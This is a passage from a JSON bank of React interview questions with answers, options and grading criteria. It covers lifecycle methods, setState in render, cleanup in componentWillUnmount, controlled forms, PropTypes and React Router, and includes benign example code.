          "answer": "Making API calls in the `constructor` or `render` method is problematic for different reasons:\n\n*   **`constructor`:** The constructor is primarily for initializing state and binding methods. It should be a pure function that doesn't cause side effects like network requests. If an API call fails or takes time in the constructor, the component might not render correctly, or you won't have a mounted component instance to `setState` on when the data arrives. It also runs before the component is mounted, so you cannot interact with the DOM or safely update state based on async results.\n\n*   **`render`:** The `render` method is responsible for returning the JSX tree. It must be a pure function that takes props and state and returns UI, without causing side effects. If you call `setState()` (which is needed to store fetched data) inside `render`, it will trigger a re-render. Since `render` is called again during the re-render, `setState()` will be called again, creating an **infinite loop**. This loop will continuously update state and re-render, eventually crashing the browser due to stack overflow or excessive memory consumption.",
          "analysisPoints": [
            "Distinguishes between issues in `constructor` and `render`.",
            "Explains the purity principle of `render`.",
            "Clearly describes the infinite loop mechanism for `render`.",
            "Mentions lack of `setState` safety in `constructor`."
          ],
          "keyConcepts": [
            "constructor",
            "render method",
            "pure functions",
            "side effects",
            "setState",
            "infinite loop",
            "lifecycle methods"
          ],
          "evaluationCriteria": [
            "Comprehensive explanation of problems for both methods.",
            "Accuracy of technical terms and concepts."
          ],
          "example": null,
          "tags": [
            "React",
            "Lifecycle Methods",
            "API Calls",
            "Anti-patterns",
            "Infinite Loop",
            "Performance"
          ],
          "prerequisites": [
            "react_class_components",
            "react_state",
            "react_lifecycle"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_api_calls_lifecycle_4",
          "topic": "API Calls in React Lifecycle",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the `useEffect` dependency array equivalent to `componentDidMount`?",
          "answer": "An empty dependency array (`[]`).",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "useEffect",
            "dependency array",
            "componentDidMount"
          ],
          "evaluationCriteria": [
            "Quick recall of `useEffect` usage"
          ],
          "example": null,
          "tags": [
            "React",
            "Hooks",
            "useEffect"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_setState_in_render_1",
          "topic": "setState() in Render Method",
          "level": "medium",
          "type": "open",
          "question": "What exact sequence of events leads to an infinite loop if `setState()` is called directly inside the `render` method of a React component?",
          "answer": "The sequence of events is as follows:\n1.  **`setState()` Call:** The `render` method executes and calls `this.setState()`. (e.g., `this.setState({ count: this.state.count + 1 });`).\n2.  **State Update:** `this.setState()` updates the component's state.\n3.  **Re-render Triggered:** React detects the state change and automatically schedules and initiates a re-render of the component.\n4.  **`render()` Re-execution:** As part of the re-render, the component's `render()` method is called again.\n5.  **Loop Continues:** The `render()` method, once again, calls `this.setState()`, which triggers another state update and another re-render, perpetuating the infinite loop. This quickly consumes system resources and crashes the browser.",
          "analysisPoints": [
            "Accurate description of `setState`'s effect (triggers re-render).",
            "Clear explanation of the recursive nature of the loop.",
            "Understanding of React's reconciliation process."
          ],
          "keyConcepts": [
            "render method",
            "setState",
            "re-render",
            "infinite loop",
            "side effects"
          ],
          "evaluationCriteria": [
            "Step-by-step clarity of the loop mechanism.",
            "Understanding of the core principle: `render` should be pure."
          ],
          "example": null,
          "tags": [
            "React",
            "Lifecycle Methods",
            "State Management",
            "Anti-patterns",
            "Infinite Loop"
          ],
          "prerequisites": [
            "react_state",
            "react_lifecycle"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_setState_in_render_2",
          "topic": "setState() in Render Method",
          "level": "easy",
          "type": "flashcard",
          "question": "Why should the `render` method be a pure function?",
          "answer": "Because it should only calculate and return JSX based on current props and state, without causing side effects like modifying state or interacting with the DOM directly. This ensures predictability and prevents issues like infinite loops.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "render method",
            "pure function",
            "side effects"
          ],
          "evaluationCriteria": [
            "Quick recall of `render`'s purity"
          ],
          "example": null,
          "tags": [
            "React",
            "Lifecycle Methods",
            "Purity"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_setState_in_render_3",
          "topic": "setState() in Render Method",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following scenarios is MOST likely to lead to an infinite loop in a React application?",
          "answer": "Calling `this.setState()` unconditionally inside the `render()` method.",
          "options": [
            "Making an API call inside `componentDidMount()`.",
            "Calling `this.setState()` unconditionally inside the `render()` method.",
            "Using a `ref` to directly access a DOM element.",
            "Updating state using `useState` in a functional component."
          ],
          "analysisPoints": [
            "Tests understanding of common React pitfalls.",
            "Distinguishes safe lifecycle operations from problematic ones.",
            "Reinforces the concept of `render` purity."
          ],
          "keyConcepts": [
            "setState",
            "render method",
            "infinite loop",
            "lifecycle methods",
            "pure functions"
          ],
          "evaluationCriteria": [
            "Correct identification of the infinite loop cause.",
            "Ability to differentiate between correct and incorrect React practices."
          ],
          "example": "Calling `this.setState()` inside `render()` is an anti-pattern because `setState()` triggers a re-render, which in turn calls `render()` again, leading to an unending cycle. The other options describe valid and common React patterns.",
          "tags": [
            "React",
            "Anti-patterns",
            "Infinite Loop",
            "State Management"
          ],
          "prerequisites": [
            "react_lifecycle",
            "react_state"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_componentWillUnmount_1",
          "topic": "componentWillUnmount()",
          "level": "medium",
          "type": "open",
          "question": "What is the primary purpose of the `componentWillUnmount()` lifecycle method in a React class component? Provide at least three common cleanup tasks you would perform within it.",
          "answer": "The primary purpose of `componentWillUnmount()` is to perform cleanup before a component is removed from the DOM. This is crucial for preventing memory leaks and ensuring the application runs efficiently.\n\nThree common cleanup tasks are:\n1.  **Removing event listeners:** If you added `window.addEventListener` or `document.addEventListener` in `componentDidMount`, they should be removed here.\n2.  **Cancelling network requests:** If a component unmounts while an asynchronous network request is still pending, you should cancel it to prevent `setState` calls on an unmounted component.\n3.  **Clearing timers:** Any `setTimeout` or `setInterval` timers initiated by the component should be cleared using `clearTimeout` or `clearInterval`.",
          "analysisPoints": [
            "Correctly states the primary purpose (cleanup, memory leaks).",
            "Lists relevant and common cleanup tasks.",
            "Demonstrates understanding of why cleanup is needed for each task."
          ],
          "keyConcepts": [
            "componentWillUnmount",
            "lifecycle methods",
            "cleanup",
            "memory leaks",
            "event listeners",
            "timers",
            "network requests"
          ],
          "evaluationCriteria": [
            "Completeness and accuracy of purpose statement.",
            "Quality and relevance of cleanup examples."
          ],
          "example": null,
          "tags": [
            "React",
            "Lifecycle Methods",
            "Cleanup",
            "Memory Leaks",
            "Performance"
          ],
          "prerequisites": [
            "react_class_components"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_componentWillUnmount_2",
          "topic": "componentWillUnmount()",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the functional component equivalent for `componentWillUnmount` cleanup logic?",
          "answer": "The return function of the `useEffect` hook.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "useEffect hook",
            "cleanup function",
            "componentWillUnmount"
          ],
          "evaluationCriteria": [
            "Quick recall of `useEffect` cleanup"
          ],
          "example": null,
          "tags": [
            "React",
            "Hooks",
            "useEffect",
            "Cleanup"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_componentWillUnmount_3",
          "topic": "componentWillUnmount()",
          "level": "medium",
          "type": "mcq",
          "question": "A React component starts a `setInterval` timer in its `componentDidMount` method. What is the most appropriate action to take in `componentWillUnmount` to prevent potential issues?",
          "answer": "Call `clearInterval()` to stop the timer.",
          "options": [
            "Call `clearTimeout()` to stop the timer.",
            "Set the component's state to null to release memory.",
            "Call `clearInterval()` to stop the timer.",
            "Nothing, React automatically cleans up timers."
          ],
          "analysisPoints": [
            "Tests understanding of timer management in React lifecycle.",
            "Identifies the correct function for clearing intervals.",
            "Debunks common misconceptions about automatic cleanup."
          ],
          "keyConcepts": [
            "componentWillUnmount",
            "setInterval",
            "clearInterval",
            "memory leaks",
            "cleanup"
          ],
          "evaluationCriteria": [
            "Correct selection of the cleanup method.",
            "Understanding of the necessity of manual cleanup for timers."
          ],
          "example": "If a `setInterval` is not cleared when a component unmounts, it will continue to run in the background, potentially trying to update the state of an unmounted component, leading to errors and memory leaks. `clearInterval()` is the correct function to stop an interval started with `setInterval()`.",
          "tags": [
            "React",
            "Lifecycle Methods",
            "Cleanup",
            "Timers",
            "Memory Leaks"
          ],
          "prerequisites": [
            "react_class_components",
            "javascript_timers"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_componentWillUnmount_4",
          "topic": "componentWillUnmount()",
          "level": "hard",
          "type": "code",
          "question": "You have a `ChatClient` component that subscribes to a WebSocket feed in `componentDidMount` and displays incoming messages. If this component is unmounted, it's crucial to unsubscribe to prevent memory leaks and unnecessary network activity. Implement the `ChatClient` class component, ensuring proper subscription and unsubscription.",
          "answer": "```javascript\nimport React from 'react';\n\n// Imagine a simplified WebSocket client\nconst MockWebSocket = {\n  _listeners: [],\n  connect: () => console.log('WebSocket connected'),\n  disconnect: () => console.log('WebSocket disconnected'),\n  subscribe: (callback) => {\n    MockWebSocket._listeners.push(callback);\n    console.log('Subscribed to WebSocket');\n    // Simulate incoming messages\n    MockWebSocket.interval = setInterval(() => {\n      const message = `Message from server: ${Date.now()}`;\n      MockWebSocket._listeners.forEach(cb => cb(message));\n    }, 2000);\n  },\n  unsubscribe: (callback) => {\n    MockWebSocket._listeners = MockWebSocket._listeners.filter(cb => cb !== callback);\n    console.log('Unsubscribed from WebSocket');\n    if (MockWebSocket._listeners.length === 0) {\n      clearInterval(MockWebSocket.interval);\n      console.log('No more subscribers, stopping message simulation.');\n    }\n  }\n};\n\nclass ChatClient extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { messages: [] };\n    this.handleNewMessage = this.handleNewMessage.bind(this);\n  }\n\n  handleNewMessage(message) {\n    this.setState(prevState => ({\n      messages: [...prevState.messages, message]\n    }));\n  }\n\n  componentDidMount() {\n    console.log('ChatClient Mounted');\n    // Subscribe to the WebSocket feed\n    MockWebSocket.connect();\n    MockWebSocket.subscribe(this.handleNewMessage);\n  }\n\n  componentWillUnmount() {\n    console.log('ChatClient Will Unmount');\n    // Unsubscribe from the WebSocket feed to prevent memory leaks\n    MockWebSocket.unsubscribe(this.handleNewMessage);\n    MockWebSocket.disconnect();\n  }\n\n  render() {\n    return (\n      <div>\n        <h3>Chat Messages</h3>\n        <div style={{ height: '150px', overflowY: 'scroll', border: '1px solid #ccc', padding: '10px' }}>\n          {this.state.messages.length === 0 ? (\n            <p>Waiting for messages...</p>\n          ) : (\n            <ul>\n              {this.state.messages.map((msg, index) => (\n                <li key={index}>{msg}</li>\n              ))}\n            </ul>\n          )}\n        </div>\n        <p>This component will log subscribe/unsubscribe actions to console.</p>\n      </div>\n    );\n  }\n}\n\n// To test, mount and unmount this component:\n// const App = () => {\n//   const [showChat, setShowChat] = React.useState(true);\n//   return (\n//     <div>\n//       <button onClick={() => setShowChat(!showChat)}>\n//         {showChat ? 'Hide Chat' : 'Show Chat'}\n//       </button>\n//       {showChat && <ChatClient />}\n//     </div>\n//   )\n// }\n// ReactDOM.render(<App />, document.getElementById('root'));\n```",
          "options": [],
          "analysisPoints": [
            "Correctly implements `componentDidMount` for subscription.",
            "Correctly implements `componentWillUnmount` for unsubscription.",
            "Demonstrates understanding of event/subscription management.",
            "Handles `this` context for the callback.",
            "Shows awareness of external resource management."
          ],
          "keyConcepts": [
            "componentDidMount",
            "componentWillUnmount",
            "subscriptions",
            "WebSockets",
            "cleanup",
            "memory leaks",
            "this binding"
          ],
          "evaluationCriteria": [
            "Code correctness for subscription/unsubscription logic.",
            "Proper use of lifecycle methods.",
            "Identification and mitigation of potential memory leaks."
          ],
          "example": "The `ChatClient` component subscribes to `MockWebSocket` in `componentDidMount` using `this.handleNewMessage` as the callback. Crucially, in `componentWillUnmount`, it calls `MockWebSocket.unsubscribe(this.handleNewMessage)` to remove the listener. This prevents the component from attempting to update its state or interact with `MockWebSocket` after it has been removed from the DOM, thus avoiding memory leaks and ensuring efficient resource usage.",
          "tags": [
            "React",
            "Class Components",
            "Code Challenge",
            "Lifecycle Methods",
            "Cleanup",
            "WebSockets"
          ],
          "prerequisites": [
            "react_class_components",
            "javascript_event_listeners"
          ],
          "complexity": 9,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_controlled_uncontrolled_components_1",
          "topic": "Controlled vs. Uncontrolled Components",
          "level": "medium",
          "type": "open",
          "question": "What is the fundamental difference between controlled and uncontrolled components in React forms? When would you choose one over the other?",
          "answer": "The fundamental difference lies in how their form data is managed:\n\n*   **Controlled Components:** Their values are controlled by React state. You pass the value via the `value` prop and update it via an `onChange` event handler that calls `setState()` (or `useState` setter). React is the 'single source of truth' for the input's value.\n*   **Uncontrolled Components:** They maintain their own internal state, similar to traditional HTML form elements. You typically use a `ref` to access their current value directly from the DOM when needed (e.g., on form submission).\n\n**When to choose:**\n*   Choose **Controlled Components** for most scenarios where you need immediate validation, transformation, conditional input enabling/disabling, or when you need to programmatically clear or pre-fill input fields. They offer more control and predictable behavior.\n*   Choose **Uncontrolled Components** for simpler forms where you only need the input value once (e.g., on form submission) and don't require real-time updates or complex validation. They might involve slightly less boilerplate for very simple use cases and can be marginally more performant for very high-frequency input if not carefully optimized, but generally offer less programmatic control.",
          "analysisPoints": [
            "Clear definition of both types based on state management.",
            "Correctly identifies `value`/`onChange` for controlled and `refs` for uncontrolled.",
            "Provides clear use cases for choosing one over the other.",
            "Discusses trade-offs (control vs. boilerplate/simplicity)."
          ],
          "keyConcepts": [
            "Controlled Components",
            "Uncontrolled Components",
            "React state",
            "Refs",
            "Form handling",
            "Data flow"
          ],
          "evaluationCriteria": [
            "Accuracy of definitions.",
            "Relevance and justification of use cases.",
            "Understanding of associated pros and cons."
          ],
          "example": null,
          "tags": [
            "React",
            "Forms",
            "State Management",
            "Refs"
          ],
          "prerequisites": [
            "react_state",
            "react_refs"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_controlled_uncontrolled_components_2",
          "topic": "Controlled vs. Uncontrolled Components",
          "level": "easy",
          "type": "flashcard",
          "question": "How do you typically access the value of an uncontrolled input component?",
          "answer": "Using a `ref` attached to the input element.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "uncontrolled components",
            "refs"
          ],
          "evaluationCriteria": [
            "Quick recall of uncontrolled access method"
          ],
          "example": null,
          "tags": [
            "React",
            "Forms",
            "Refs"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_controlled_uncontrolled_components_3",
          "topic": "Controlled vs. Uncontrolled Components",
          "level": "medium",
          "type": "mcq",
          "question": "You need to implement a search input field that provides instant feedback to the user, showing validation errors as they type and filtering a list in real-time. Which type of form component is most suitable for this scenario in React?",
          "answer": "Controlled component",
          "options": [
            "Controlled component",
            "Uncontrolled component",
            "Both are equally suitable",
            "Neither, you should use a third-party form library"
          ],
          "analysisPoints": [
            "Tests ability to apply controlled/uncontrolled concepts to practical scenarios.",
            "Evaluates understanding of real-time interaction requirements."
          ],
          "keyConcepts": [
            "Controlled Components",
            "Uncontrolled Components",
            "Real-time validation",
            "Instant feedback",
            "User input"
          ],
          "evaluationCriteria": [
            "Correct choice based on functional requirements.",
            "Implicit understanding of the limitations of uncontrolled components for such features."
          ],
          "example": "For real-time validation, filtering, or any scenario requiring immediate programmatic control over the input's value, a controlled component is ideal. The `onChange` handler allows you to capture every keystroke, update state, and then perform any logic (validation, filtering) based on that updated state.",
          "tags": [
            "React",
            "Forms",
            "Controlled Components",
            "UX",
            "Real-time"
          ],
          "prerequisites": [
            "react_state"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_controlled_uncontrolled_components_4",
          "topic": "Controlled vs. Uncontrolled Components",
          "level": "hard",
          "type": "code",
          "question": "Implement a simple form with two input fields: one for 'Username' (which should be controlled) and another for 'File Upload' (which should be uncontrolled, using a file input). The form should display the username in real-time as it's typed and log both username and selected file (if any) to the console on submission.",
          "answer": "```javascript\nimport React, { useState, useRef } from 'react';\n\nfunction FormExample() {\n  // Controlled component state for username\n  const [username, setUsername] = useState('');\n\n  // Uncontrolled component ref for file input\n  const fileInputRef = useRef(null);\n\n  const handleUsernameChange = (event) => {\n    setUsername(event.target.value);\n  };\n\n  const handleSubmit = (event) => {\n    event.preventDefault();\n    \n    // Accessing controlled component value from state\n    console.log('Submitted Username:', username);\n\n    // Accessing uncontrolled component value from ref\n    if (fileInputRef.current && fileInputRef.current.files.length > 0) {\n      console.log('Submitted File:', fileInputRef.current.files[0].name);\n    } else {\n      console.log('No file selected.');\n    }\n\n    alert(`Username: ${username}\\nFile: ${fileInputRef.current?.files[0]?.name || 'None'}`);\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <h2>Controlled & Uncontrolled Form</h2>\n      <div>\n        <label htmlFor=\"username\">Username (Controlled):</label>\n        <input\n          id=\"username\"\n          type=\"text\"\n          value={username}\n          onChange={handleUsernameChange}\n          placeholder=\"Type your username\"\n        />\n        <p>Current Username: {username}</p>\n      </div>\n      <br />\n      <div>\n        <label htmlFor=\"fileUpload\">Select File (Uncontrolled):</label>\n        <input\n          id=\"fileUpload\"\n          type=\"file\"\n          ref={fileInputRef} // Attach ref\n        />\n      </div>\n      <br />\n      <button type=\"submit\">Submit Form</button>\n    </form>\n  );\n}\n```",
          "options": [],
          "analysisPoints": [
            "Correctly implements a controlled input with `useState` and `onChange`.",
            "Correctly implements an uncontrolled file input using `useRef`.",
            "Successfully accesses values from both types of inputs on form submission.",
            "Demonstrates understanding of `input type='file'` and its `files` property."
          ],
          "keyConcepts": [
            "Controlled Components",
            "Uncontrolled Components",
            "useState hook",
            "useRef hook",
            "Form handling",
            "File input"
          ],
          "evaluationCriteria": [
            "Functional correctness for both input types.",
            "Clear distinction in implementation for controlled vs. uncontrolled.",
            "Proper handling of form submission.",
            "Code cleanliness and adherence to React patterns."
          ],
          "example": "This solution demonstrates how to combine controlled and uncontrolled inputs within a single form. The username input is `controlled` by React state, allowing its value to be displayed in real-time. The file input is `uncontrolled`, with its value accessed via a `useRef` on form submission. This highlights the practical application of both component types.",
          "tags": [
            "React",
            "Forms",
            "Code Challenge",
            "Controlled Components",
            "Uncontrolled Components",
            "Refs"
          ],
          "prerequisites": [
            "react_state",
            "react_refs",
            "react_forms_handling"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_propTypes_1",
          "topic": "PropTypes",
          "level": "medium",
          "type": "open",
          "question": "What are React PropTypes, and why are they considered useful in React development?",
          "answer": "React PropTypes are a mechanism for type-checking the props passed to a component. They allow you to define the expected data types, shapes, and requiredness of props. They are useful because:\n1.  **Documentation:** They serve as explicit documentation for a component's API, making it easier for other developers (or your future self) to understand what props a component expects.\n2.  **Runtime Validation & Warnings:** In development mode, if a component receives props that do not match the specified PropTypes, React will log a warning to the console. This helps catch bugs related to incorrect data types early.\n3.  **Debugging Aid:** The warnings provide clear guidance on prop-related issues, simplifying the debugging process.\n4.  **Performance:** PropTypes are automatically removed in production builds, so they do not add any performance overhead to your deployed application.",
          "analysisPoints": [
            "Correctly defines PropTypes.",
            "Lists at least three valid reasons for their usefulness.",
            "Mentions their development-only nature."
          ],
          "keyConcepts": [
            "PropTypes",
            "type checking",
            "props",
            "validation",
            "documentation",
            "development mode"
          ],
          "evaluationCriteria": [
            "Clarity and completeness of the definition.",
            "Quality and accuracy of the listed benefits."
          ],
          "example": null,
          "tags": [
            "React",
            "Props",
            "Validation",
            "Development Tools"
          ],
          "prerequisites": [
            "react_props"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_propTypes_2",
          "topic": "PropTypes",
          "level": "easy",
          "type": "flashcard",
          "question": "Are PropTypes active in production builds of a React application?",
          "answer": "No, PropTypes are automatically removed in production builds for performance optimization.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "PropTypes",
            "production build",
            "performance"
          ],
          "evaluationCriteria": [
            "Quick recall of production behavior"
          ],
          "example": null,
          "tags": [
            "React",
            "PropTypes",
            "Performance"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_propTypes_3",
          "topic": "PropTypes",
          "level": "medium",
          "type": "mcq",
          "question": "A component `UserCard` expects a `user` prop which is an object with `id` (number), `name` (string), and `isActive` (boolean). All these properties are required. Which of the following `propTypes` definitions is correct for `UserCard`?",
          "answer": "```javascript\nUserCard.propTypes = {\n  user: PropTypes.shape({\n    id: PropTypes.number.isRequired,\n    name: PropTypes.string.isRequired,\n    isActive: PropTypes.bool.isRequired\n  }).isRequired\n};\n```",
          "options": [
            "```javascript\nUserCard.propTypes = {\n  user: PropTypes.object({\n    id: PropTypes.number,\n    name: PropTypes.string,\n    isActive: PropTypes.bool\n  }).isRequired\n};\n```",
            "```javascript\nUserCard.propTypes = {\n  user: PropTypes.shape({\n    id: PropTypes.number.isRequired,\n    name: PropTypes.string.isRequired,\n    isActive: PropTypes.bool.isRequired\n  }).isRequired\n};\n```",
            "```javascript\nUserCard.propTypes = {\n  user: {\n    id: PropTypes.number.isRequired,\n    name: PropTypes.string.isRequired,\n    isActive: PropTypes.bool.isRequired\n  }\n};\n```",
            "```javascript\nUserCard.propTypes = {\n  user: PropTypes.object.isRequired\n};\n```"
          ],
          "analysisPoints": [
            "Tests understanding of `PropTypes.shape` for object validation.",
            "Tests correct application of `.isRequired` for nested properties and the main prop.",
            "Distinguishes correct `PropTypes` syntax from incorrect (e.g., plain object)."
          ],
          "keyConcepts": [
            "PropTypes",
            "PropTypes.shape",
            "isRequired",
            "Object validation",
            "Nested PropTypes"
          ],
          "evaluationCriteria": [
            "Correct syntax for `PropTypes.shape`.",
            "Accurate use of `isRequired` at all levels required by the question."
          ],
          "example": "The correct answer uses `PropTypes.shape` to define the exact structure of the `user` object. Each nested property (`id`, `name`, `isActive`) is then validated for its specific type and marked as `isRequired`. Finally, the `user` prop itself is also marked as `isRequired`, meaning the `UserCard` component *must* receive a `user` prop that matches the defined shape.",
          "tags": [
            "React",
            "PropTypes",
            "Validation",
            "Object Structures"
          ],
          "prerequisites": [
            "react_props"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_propTypes_4",
          "topic": "PropTypes",
          "level": "hard",
          "type": "code",
          "question": "Create a `ProductCard` functional component that displays product details. It should accept the following props:\n- `product`: an object with `id` (number, required), `name` (string, required), `price` (number, required), and `isInStock` (boolean, optional).\n- `onAddToCart`: a function (required).\n\nDefine appropriate `propTypes` for this component. Then, demonstrate its usage with a valid `product` and an `onAddToCart` function, and describe what would happen (in development mode) if you tried to render it with a missing required prop or a prop of the wrong type (e.g., `price` as a string).",
          "answer": "```javascript\nimport React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction ProductCard({ product, onAddToCart }) {\n  return (\n    <div style={{\n      border: '1px solid #ddd',\n      padding: '15px',\n      margin: '10px',\n      borderRadius: '8px',\n      backgroundColor: product.isInStock ? '#fff' : '#f8f8f8',\n      opacity: product.isInStock ? 1 : 0.7\n    }}>\n      <h3>{product.name} (ID: {product.id})</h3>\n      <p>Price: ${product.price.toFixed(2)}</p>\n      <p>Status: {product.isInStock ? 'In Stock' : 'Out of Stock'}</p>\n      <button onClick={() => onAddToCart(product.id)} disabled={!product.isInStock}>\n        {product.isInStock ? 'Add to Cart' : 'Out of Stock'}\n      </button>\n    </div>\n  );\n}\n\nProductCard.propTypes = {\n  product: PropTypes.shape({\n    id: PropTypes.number.isRequired,\n    name: PropTypes.string.isRequired,\n    price: PropTypes.number.isRequired,\n    isInStock: PropTypes.bool\n  }).isRequired,\n  onAddToCart: PropTypes.func.isRequired\n};\n\n// --- Demonstration Component ---\nfunction AppProductDisplay() {\n  const handleAddToCart = (productId) => {\n    console.log(`Product ${productId} added to cart!`);\n    alert(`Product ${productId} added to cart!`);\n  };\n\n  const validProduct = {\n    id: 101,\n    name: 'Fancy Gadget',\n    price: 99.99,\n    isInStock: true\n  };\n\n  const invalidProductMissingName = {\n    id: 102,\n    // name: 'Missing Name',\n    price: 19.99,\n    isInStock: false\n  };\n\n  const invalidProductWrongType = {\n    id: 103,\n    name: 'Broken Item',\n    price: 'twenty dollars', // Price as string, should be number\n    isInStock: true\n  };\n\n  return (\n    <div>\n      <h1>Product Listings</h1>\n      <h2>Valid Product:</h2>\n      <ProductCard product={validProduct} onAddToCart={handleAddToCart} />\n\n      <h2>Invalid Product (Missing Name - Check Console!):</h2>\n      {/* This will cause a PropTypes warning in development console */}\n      <ProductCard product={invalidProductMissingName} onAddToCart={handleAddToCart} />\n\n      <h2>Invalid Product (Wrong Price Type - Check Console!):</h2>\n      {/* This will cause a PropTypes warning in development console */}\n      <ProductCard product={invalidProductWrongType} onAddToCart={handleAddToCart} />\n    </div>\n  );\n}\n```\n\n**Explanation of what would happen with invalid props:**\nIn **development mode**, if you render `ProductCard` with `invalidProductMissingName` (missing `name` prop which is `isRequired`), React will log a console warning similar to:\n\n```\nWarning: Failed prop type: The prop `product.name` is marked as required in `ProductCard`, but its value is `undefined`.\n    at ProductCard\n```\n\nIf you render it with `invalidProductWrongType` (where `price` is a string instead of a number), React will log a warning like:\n\n```\nWarning: Failed prop type: Invalid prop `product.price` of type `string` supplied to `ProductCard`, expected `number`.\n    at ProductCard\n```\n\nThese warnings provide clear, actionable feedback, helping developers identify and correct prop type mismatches during development, preventing potential runtime errors later.",
          "options": [],
          "analysisPoints": [
            "Correctly defines PropTypes for an object (`shape`) and a function (`func`).",
            "Applies `isRequired` correctly to both top-level and nested properties.",
            "Demonstrates usage with valid props.",
            "Accurately describes the console warnings for missing and wrong-type props.",
            "Shows practical application of PropTypes for component contracts."
          ],
          "keyConcepts": [
            "PropTypes",
            "PropTypes.shape",
            "PropTypes.func",
            "isRequired",
            "Prop validation",
            "Development mode warnings",
            "Component API"
          ],
          "evaluationCriteria": [
            "Completeness and correctness of `propTypes` definition.",
            "Correct code for the component and its demonstration.",
            "Thorough explanation of development-time warnings.",
            "Practical understanding of component contracts."
          ],
          "example": null,
          "tags": [
            "React",
            "Code Challenge",
            "PropTypes",
            "Validation",
            "Component Design"
          ],
          "prerequisites": [
            "react_props"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_routing_1",
          "topic": "React Routing",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of the `Switch` (or `Routes` in v6) component in React Router. What problem does it solve?",
          "answer": "The `Switch` component (renamed to `Routes` in React Router v6) is used to render **only the first `Route` that matches** the current URL. The problem it solves is ambiguity when multiple `Route` components might potentially match a given URL.\n\nWithout `Switch`/`Routes`, if you had routes like `<Route path=\"/\" component={Home} />` and `<Route path=\"/about\" component={About} />`, visiting `/about` would render *both* `Home` (because `/` is a prefix of `/about`) and `About`. `Switch`/`Routes` ensures that as soon as a `Route` path matches, it stops looking for other matches and renders only that single component. This is essential for:\n\n*   **Exclusive Rendering:** Ensuring only one component renders for a given path.\n*   **404 (Not Found) Pages:** It allows you to place a catch-all route (e.g., `<Route path=\"*\" component={NotFound} />`) as the last `Route` inside `Switch`/`Routes`. This route will only render if no other preceding routes have matched the URL.",
          "analysisPoints": [
            "Correctly identifies the primary function (render first match).",
            "Explains the problem (multiple matches without it).",
            "Provides concrete use cases like 404 pages.",
            "Mentions the v6 naming change."
          ],
          "keyConcepts": [
            "React Router",
            "Switch component",
            "Routes component",
            "Route matching",
            "404 page",
            "Exclusive rendering"
          ],
          "evaluationCriteria": [
            "Clarity of purpose.",
            "Accuracy of problem description.",
            "Relevant examples for application."
          ],
          "example": null,
          "tags": [
            "React",
            "React Router",
            "Routing",
            "Navigation"
          ],
          "prerequisites": [
            "react_components"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_routing_2",
          "topic": "React Routing",
          "level": "easy",
          "type": "flashcard",
          "question": "Which prop in a React Router `Route` component ensures that the component only renders when the path exactly matches the URL, not just as a prefix?",
          "answer": "`exact` (for React Router v5 and earlier, implicit in v6 for `path=\"/\"`)",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Route component",
            "exact prop",
            "path matching"
          ],
          "evaluationCriteria": [
            "Quick recall of `exact` prop"
          ],
          "example": null,
          "tags": [
            "React",
            "React Router",
            "Routing"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_routing_3",
          "topic": "React Routing",
          "level": "medium",
          "type": "mcq",
          "question": "You want to create a route for user profiles like `/users/123` where `123` is the user ID. Which `Route` path definition correctly captures this dynamic segment, and how would you access the `id` within a functional component using React Router v6?",
          "answer": "Path: `/users/:id`; Access with: `const { id } = useParams();`",
          "options": [
            "Path: `/users/id`; Access with: `props.match.params.id`",
            "Path: `/users/:id`; Access with: `const { id } = useParams();`",
            "Path: `/users?id`; Access with: `const { id } = useLocation().searchParams;`",
            "Path: `/users/*`; Access with: `const { id } = useHistory().location.state;`"
          ],
          "analysisPoints": [
            "Tests understanding of dynamic route syntax (`:`).",
            "Tests knowledge of React Router v6 hooks (`useParams`).",
            "Differentiates between path parameters and query parameters (though query params would use `URLSearchParams`)."
          ],
